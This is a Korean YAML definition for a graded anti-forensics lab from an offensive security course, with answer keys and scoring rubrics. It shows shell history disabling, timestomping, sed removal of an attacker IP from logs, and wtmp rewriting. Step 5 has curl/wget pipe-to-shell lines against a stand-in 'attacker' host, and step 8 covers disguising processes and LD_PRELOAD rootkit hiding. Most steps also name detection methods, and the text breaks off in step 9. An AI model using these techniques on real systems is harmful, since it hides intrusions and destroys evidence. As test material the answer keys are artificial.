lab_id: attack-adv-nonai-week11
title: 안티포렌식 기법
version: non-ai
course: attack-adv-nonai
week: 11
description: 디지털 포렌식 수사를 방해하는 안티포렌식 기법을 실습한다. 로그 삭제, 타임스탬프 조작, 파일리스 공격, 암호화 등 흔적 은닉 기법을 다룬다.
difficulty: hard
duration_minutes: 120
objectives:
- 디지털 포렌식의 증거 수집 과정과 도구를 이해한다
- 타임스탬프 조작, 로그 삭제 등 안티포렌식 기법을 적용한다
- 파일리스 공격과 메모리 전용 실행 기법을 실습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 현재 시스템의 포렌식 아티팩트를 확인하라. bash_history, wtmp, lastlog, syslog 등의 위치와 내용을 확인하라.
  hint: 포렌식에서 중요한 로그 파일의 위치와 형식을 파악한다
  category: analysis
  points: 10
  answer: echo '=== Forensic Artifacts ===' && echo '[Bash History]' && wc -l ~/.bash_history 2>/dev/null
    && echo '[Login Records]' && last -5 2>/dev/null && echo '[Auth Log]' && tail -3 /var/log/auth.log
    2>/dev/null && echo '[Syslog]' && tail -3 /var/log/syslog 2>/dev/null && echo '[File Timestamps]'
    && stat ~/.bashrc | grep -E '(Access|Modify|Change)'
  answer_detail: 디지털 포렌식의 주요 아티팩트는 로그 파일(syslog, auth.log), 로그인 기록(wtmp, lastlog), 셸 히스토리(.bash_history),
    파일 타임스탬프(MAC times)이다. 이들은 공격자의 활동을 재구성하는 데 사용된다. 안티포렌식은 이러한 아티팩트를 조작하거나 제거한다.
  verify:
    type: output_contains
    expect: Forensic Artifacts
    field: stdout
    semantic:
      intent: '포렌식 아티팩트 — bash_history(wc -l) + last(wtmp) + auth.log + syslog + stat MAC times. 디지털 포렌식
        주요 소스: 로그/로그인/셸/타임스탬프. 공격자 활동 재구성 핵심. SANS DFIR 포렌식 가이드.'
      success_criteria:
      - Forensic Artifacts 키워드
      - 5개 소스 (history/last/auth/syslog/stat)
      - MAC times (Access/Modify/Change)
      acceptable_methods:
      - 수동 명령 종합
      - ftk-imager
      - Sleuth Kit fls
      negative_signs:
      - 소스 2개 이하
      - MAC 타임스탬프 없음
      - 포렌식 맥락 없음
  target_vm: attacker
- order: 2
  instruction: 셸 히스토리를 조작하라. 현재 세션의 명령 기록을 비활성화하고, 특정 명령을 히스토리에서 제거하는 방법을 보여라.
  hint: HISTFILE, HISTSIZE, history -d 등을 사용한다
  category: exploit
  points: 10
  answer: echo '=== History Manipulation ===' && echo 'Current HISTFILE:' $HISTFILE && echo 'Current HISTSIZE:'
    $HISTSIZE && echo '' && echo 'Disable history for session:' && echo 'unset HISTFILE' && echo 'export
    HISTSIZE=0' && echo 'set +o history' && echo '' && echo 'Delete specific entry:' && echo 'history
    -d <line_number>' && echo '' && echo 'Clear all history:' && echo 'history -c && history -w' && echo
    '' && echo 'Prevent future logging:' && echo 'ln -sf /dev/null ~/.bash_history'
  answer_detail: 셸 히스토리 조작은 가장 기본적인 안티포렌식이다. HISTFILE을 /dev/null로 심볼릭 링크하면 이후 명령이 기록되지 않는다. HISTCONTROL=ignorespace를
    설정하면 공백으로 시작하는 명령이 기록되지 않는다. 하지만 auditd가 설정되어 있으면 execve 시스템 콜 수준에서 모든 명령이 기록된다.
  verify:
    type: output_contains
    expect: History Manipulation
    field: stdout
    semantic:
      intent: 셸 히스토리 조작 — unset HISTFILE + export HISTSIZE=0 + set +o history + ln -sf /dev/null ~/.bash_history.
        HISTCONTROL=ignorespace로 공백 시작 명령 미기록. auditd execve syscall 수준 기록 시 회피 불가. MITRE T1070.003 Clear
        Command History.
      success_criteria:
      - History Manipulation 키워드
      - HISTFILE/HISTSIZE/history -d 3개 이상
      - auditd 한계 언급
      acceptable_methods:
      - HISTFILE 조작
      - rm + 새 셸
      - HISTCONTROL=ignorespace
      negative_signs:
      - 조작 방법 1개
      - auditd 맥락 없음
      - 단순 history -c
  target_vm: attacker
- order: 3
  instruction: 파일의 타임스탬프(MAC times)를 조작하라. touch 명령으로 특정 파일의 접근/수정 시간을 과거로 변경하라.
  hint: touch -t YYYYMMDDhhmm 파일 또는 touch -r 참조파일 대상파일로 타임스탬프를 변경한다
  category: exploit
  points: 10
  answer: 'echo ''test'' > /tmp/antiforensic_test.txt && echo ''Before:'' && stat /tmp/antiforensic_test.txt
    | grep -E ''(Access|Modify|Change)'' && touch -t 202301010000 /tmp/antiforensic_test.txt && echo ''After
    timestamp manipulation:'' && stat /tmp/antiforensic_test.txt | grep -E ''(Access|Modify|Change)''
    && echo '''' && echo ''Note: Change time (ctime) cannot be set by touch'' && echo ''Forensic detection:
    ctime newer than mtime indicates tampering'''
  answer_detail: MAC 타임스탬프(Modify/Access/Change)는 파일 활동의 타임라인을 재구성하는 핵심 아티팩트이다. touch로 atime과 mtime을 변경할
    수 있지만, ctime(inode 변경 시간)은 일반적인 방법으로 변경할 수 없다. ctime이 mtime보다 새로우면 타임스탬프 조작의 증거가 된다.
  verify:
    type: output_contains
    expect: timestamp manipulation
    field: stdout
    semantic:
      intent: 타임스탬프 조작 — touch -t 202301010000 file (atime/mtime 변경) 또는 touch -r reference target. ctime(inode
        변경)은 일반 touch로 변경 불가. ctime > mtime = 조작 증거. NTFS는 $MFT vs $STDINFO 비교. MITRE T1070.006 Timestomp.
      success_criteria:
      - timestamp manipulation 키워드
      - touch -t 또는 -r
      - ctime 변경 불가 한계
      acceptable_methods:
      - touch -t/-r
      - Python os.utime()
      - setfattr (확장 속성)
      negative_signs:
      - touch 없음
      - ctime 한계 누락
      - before/after 비교 없음
  target_vm: attacker
- order: 4
  instruction: 로그 파일에서 특정 항목을 선택적으로 제거하라. sed를 사용하여 특정 IP나 키워드가 포함된 로그 라인을 삭제하는 기법을 보여라.
  hint: sed -i '/패턴/d' 로그파일로 특정 라인을 삭제한다
  category: exploit
  points: 10
  answer: cp /var/log/syslog /tmp/syslog_copy 2>/dev/null || echo 'test log line with 10.20.30.201' >
    /tmp/syslog_copy && echo 'test normal log line' >> /tmp/syslog_copy && echo 'Before:' && wc -l /tmp/syslog_copy
    && echo '' && sed -i '/10.20.30.201/d' /tmp/syslog_copy && echo 'After removing attacker IP lines:'
    && wc -l /tmp/syslog_copy && echo '' && echo '=== Log Tampering Techniques ===' && echo '1. sed -i
    "/pattern/d" logfile - Remove matching lines' && echo '2. > logfile - Truncate file (preserves inode)'
    && echo '3. shred -u logfile - Secure delete' && echo '4. logrotate manipulation - Force early rotation'
  answer_detail: 선택적 로그 삭제는 공격 흔적만 제거하면서 로그의 전체 무결성을 유지하려는 기법이다. 하지만 로그 갭(gap)이 발생하거나, 원격 로그 서버(rsyslog)에
    사본이 있으면 탐지된다. 방어를 위해 로그를 원격 서버에 실시간 전송하고, 쓰기 전용(append-only) 스토리지를 사용해야 한다.
  verify:
    type: output_contains
    expect:
    - Log Tampering
    - sed
    field: stdout
    semantic:
      intent: '선택적 로그 삭제 — sed -i ''/10.20.30.201/d'' /var/log/syslog. 공격 흔적만 제거 + 무결성 유지 시도. 로그 갭/원격
        rsyslog 사본/inode 보존(>) 등 탐지 가능. 방어: 원격 + append-only. MITRE T1070.002 Clear Linux Logs.'
      success_criteria:
      - Log Tampering 또는 sed -i 키워드
      - 패턴 기반 삭제 + 다른 기법 (truncate/shred)
      - 탐지 (원격 로그 비교) 언급
      acceptable_methods:
      - sed -i 라인 삭제
      - logtamper / wipethemall
      - 잘 만든 awk/perl 스크립트
      negative_signs:
      - 삭제 명령 없음
      - 패턴 매칭 없음
      - 탐지 없음
  target_vm: attacker
- order: 5
  instruction: 파일리스(Fileless) 공격을 시뮬레이션하라. 메모리에서만 실행되는 코드를 구성하여 디스크에 흔적을 남기지 않는 기법을 보여라.
  hint: curl | bash, python -c, /dev/shm 등을 활용한 메모리 전용 실행을 시뮬레이션한다
  category: exploit
  points: 10
  answer: 'echo ''=== Fileless Attack Techniques ==='' && echo '''' && echo ''[1] Download and Execute
    in Memory'' && echo ''curl -s http://attacker/payload.sh | bash'' && echo ''wget -qO- http://attacker/payload.py
    | python3'' && echo '''' && echo ''[2] Memory-only execution'' && echo ''python3 -c "import os; os.system(\"id\")"''
    && echo '''' && echo ''[3] tmpfs/ramfs (no disk touch)'' && ls -la /dev/shm/ | head -5 && echo ''Files
    in /dev/shm are in RAM only'' && echo '''' && echo ''[4] Process injection'' && echo ''/proc/<pid>/mem
    write (ptrace)'' && echo '''' && echo ''[5] Living off the Land (LOLBins)'' && echo ''Uses legitimate
    system tools: curl, python, perl, awk'''
  answer_detail: 파일리스 공격은 디스크에 악성 파일을 생성하지 않아 파일 기반 AV와 포렌식을 회피한다. 파이프라인 실행(curl|bash), 인터프리터 인라인 실행(python
    -c), tmpfs 활용, LOLBins(Living off the Land Binaries)가 대표적이다. 탐지를 위해서는 메모리 분석, 프로세스 모니터링, 행위 기반 탐지가
    필요하다.
  verify:
    type: output_contains
    expect: Fileless Attack
    field: stdout
    semantic:
      intent: '파일리스 공격 — curl | bash + python -c + /dev/shm tmpfs + /proc/<pid>/mem (ptrace) + LOLBins(curl/python/perl/awk).
        디스크 흔적 X → 파일 기반 AV 회피. 탐지: 메모리 분석 + 프로세스 모니터링 + 행위 기반. MITRE T1059 Command and Scripting Interpreter.'
      success_criteria:
      - Fileless Attack 키워드
      - 기법 4개 이상 (curl|bash, python -c, tmpfs, ptrace, LOLBins)
      - 디스크 흔적 X 맥락
      acceptable_methods:
      - curl | bash 패턴
      - tmpfs 활용
      - LOLBins 사용
      negative_signs:
      - 기법 2개 이하
      - 탐지 맥락 없음
      - 메모리 전용 강조 없음
  target_vm: attacker
- order: 6
  instruction: 파일 삭제 후 복구 방지를 위한 안전 삭제(Secure Delete) 기법을 실습하라. shred, dd, wipe 등의 도구를 비교하라.
  hint: shred -vfz -n 3으로 다회 덮어쓰기를 수행한다
  category: exploit
  points: 10
  answer: 'echo ''sensitive data'' > /tmp/secure_del_test.txt && echo ''Before shred:'' && cat /tmp/secure_del_test.txt
    && shred -vfz -n 3 /tmp/secure_del_test.txt 2>&1 && echo ''---'' && echo ''=== Secure Deletion Methods
    ==='' && echo ''1. shred -n 3 file: 3-pass overwrite + zero fill'' && echo ''2. dd if=/dev/urandom
    of=file bs=1M: Random data overwrite'' && echo ''3. wipe -f file: Gutmann 35-pass method'' && echo
    '''' && echo ''SSD Note: Secure delete unreliable on SSDs (wear leveling)'' && echo ''Encryption is
    more reliable: encrypt before delete'' && rm -f /tmp/secure_del_test.txt'
  answer_detail: 안전 삭제는 파일 내용을 무작위 데이터로 덮어쓴 후 삭제하여 데이터 복구를 방지한다. shred는 다회 덮어쓰기(DoD 5220.22-M 표준), wipe는
    Gutmann 35-pass를 수행한다. SSD에서는 wear leveling으로 인해 안전 삭제가 보장되지 않으므로, FDE(Full Disk Encryption)가 더 효과적이다.
  verify:
    type: output_contains
    expect:
    - Secure Deletion
    - Secure Delete
    field: stdout
    semantic:
      intent: 안전 삭제 — shred -vfz -n 3 (DoD 5220.22-M 3패스 + 제로) + dd if=/dev/urandom + wipe -f (Gutmann
        35패스). SSD wear leveling 한계 → FDE 권장. MITRE T1070.004 File Deletion.
      success_criteria:
      - Secure Deletion 키워드
      - shred + dd + wipe 3종
      - SSD 한계 + FDE 대안
      acceptable_methods:
      - shred -n 3
      - dd urandom
      - wipe Gutmann / scrub
      negative_signs:
      - 단순 rm만
      - 패스 수 없음
      - SSD 한계 누락
  target_vm: attacker
- order: 7
  instruction: utmp/wtmp 레코드를 조작하는 원리를 분석하라. 로그인 기록을 수정하는 도구와 기법을 설명하라.
  hint: utmpdump으로 바이너리 로그를 텍스트로 변환하고 수정할 수 있다
  category: exploit
  points: 10
  answer: 'echo ''=== Login Record Manipulation ==='' && echo ''[Current records]'' && last -5 2>/dev/null
    && echo '''' && echo ''[utmpdump - convert binary to text]'' && utmpdump /var/run/utmp 2>/dev/null
    | head -5 && echo '''' && echo ''[Manipulation methods]'' && echo ''1. utmpdump /var/log/wtmp > /tmp/wtmp.txt''
    && echo ''   Edit text file, remove entries'' && echo ''   utmpdump -r < /tmp/wtmp.txt > /var/log/wtmp''
    && echo '''' && echo ''2. logtamper tools: Remove specific login entries'' && echo '''' && echo ''3.
    Truncate: > /var/log/wtmp (erases all)'' && echo '''' && echo ''[Detection]'' && echo ''- Compare
    wtmp with auth.log timestamps'' && echo ''- File size decrease without rotation'' && echo ''- inode
    change time vs modification time'''
  answer_detail: utmp/wtmp/lastlog는 바이너리 형식의 로그인 기록으로, utmpdump로 텍스트 변환 후 수정하고 다시 바이너리로 변환할 수 있다. 하지만
    auth.log, syslog 등 텍스트 로그에도 로그인 기록이 남으므로 모든 로그를 일관되게 수정해야 한다. 원격 로그 서버가 있으면 로컬 조작이 무의미해진다.
  verify:
    type: output_contains
    expect: Login Record
    field: stdout
    semantic:
      intent: utmp/wtmp 조작 — utmpdump /var/log/wtmp > text (바이너리→텍스트) + 편집 + utmpdump -r < text > wtmp
        (다시 바이너리). last/lastlog 영향. auth.log/syslog 텍스트 사본 일관 수정 필요. 원격 로그 서버 시 무의미. MITRE T1070.002.
      success_criteria:
      - Login Record 키워드
      - utmpdump 변환/역변환
      - auth.log 일관성 + 원격 서버 한계
      acceptable_methods:
      - utmpdump
      - wipethemall
      - logtamper
      negative_signs:
      - utmpdump 없음
      - 일관성 맥락 없음
      - 탐지 없음
  target_vm: attacker
- order: 8
  instruction: 프로세스 은닉 기법을 분석하라. 공격 프로세스를 숨기거나 합법적 프로세스로 위장하는 방법을 설명하라.
  hint: 프로세스명 변경, LD_PRELOAD를 통한 ps 출력 조작, /proc 조작 등을 다룬다
  category: exploit
  points: 10
  answer: echo '=== Process Hiding Techniques ===' && echo '' && echo '[1] Process Name Manipulation'
    && echo 'exec -a "[kworker/0:1]" /tmp/malware (mimics kernel thread)' && echo 'prctl(PR_SET_NAME,
    "sshd") (programmatic rename)' && echo '' && echo '[2] LD_PRELOAD rootkit' && echo 'Intercept readdir()
    to hide /proc/<pid> entries' && echo 'ps, top, ls show normal output' && echo '' && echo '[3] Mount
    namespace' && echo 'unshare --mount /bin/bash' && echo 'Mount tmpfs over /proc/<pid> to hide process'
    && echo '' && echo '[4] Living off the Land' && echo 'Use legitimate process names and paths' && echo
    'Inject into existing processes (svchost, sshd)' && echo '' && echo '[Detection]' && echo '- Compare
    /proc listing with ps output' && echo '- Check for LD_PRELOAD in /proc/<pid>/environ' && echo '- Kernel
    module listing for rootkits'
  answer_detail: 프로세스 은닉은 악성 프로세스가 시스템 관리자나 EDR에 발견되지 않도록 한다. 커널 스레드명([kworker])으로 위장하거나, LD_PRELOAD로
    ps/top의 출력을 조작한다. 고급 루트킷은 커널 모듈로 /proc를 직접 조작한다. Volatility 등 메모리 포렌식 도구로 은닉된 프로세스를 탐지할 수 있다.
  verify:
    type: output_contains
    expect:
    - Process Hiding
    - 프로세스 은닉
    field: stdout
    semantic:
      intent: '프로세스 은닉 — exec -a [kworker/0:1] /tmp/malware (커널 스레드 위장) + prctl(PR_SET_NAME) + LD_PRELOAD
        readdir 후크 (/proc/<pid> 숨김) + Mount namespace + LOLBins(svchost/sshd 인젝션). 탐지: /proc vs ps 비교
        + LD_PRELOAD env 검사 + 커널 모듈. MITRE T1036.005.'
      success_criteria:
      - Process Hiding 또는 은닉 키워드
      - 기법 3개 이상
      - 탐지 (/proc 비교) 명시
      acceptable_methods:
      - exec -a 위장
      - LD_PRELOAD rootkit
      - Diamorphine 커널 모듈
      negative_signs:
      - 기법 1개 이하
      - 탐지 없음
      - rootkit 맥락 없음
  target_vm: attacker
- order: 9
  instruction: auditd 로그를 분석하고, 공격자 관점에서 auditd를 회피하는 방법을 설명하라.
  hint: auditctl -l로 현재 감사 규칙을 확인하고, 회피 기법을 문서화한다
  category: analysis
  points: 10
  answer: 'echo ''=== Auditd Analysis & Evasion ==='' && auditctl -l 2>/dev/null | head -10 || echo ''No
